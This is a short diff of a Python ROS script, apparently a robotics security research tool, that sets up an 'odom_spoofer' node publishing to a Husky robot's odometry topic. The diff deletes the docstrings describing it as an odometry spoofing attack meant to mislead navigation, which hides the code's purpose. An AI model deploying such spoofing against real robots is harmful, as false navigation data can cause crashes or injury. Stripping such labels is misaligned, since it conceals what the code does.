@@ -1,8 +1,4 @@
 #!/usr/bin/env python3
-"""
-Odometry Spoofing Attack
-Publishes false position and velocity data to mislead navigation
-"""
 
 import rospy
 from nav_msgs.msg import Odometry
@@ -10,7 +6,7 @@ from geometry_msgs.msg import Quaternion
 import tf
 
 def odom_spoofing_attack():
-    """Execute odometry spoofing attack"""
+
     try:
         rospy.init_node('odom_spoofer', anonymous=True)
         pub = rospy.Publisher('/husky_velocity_controller/odom', Odometry, queue_size=10)
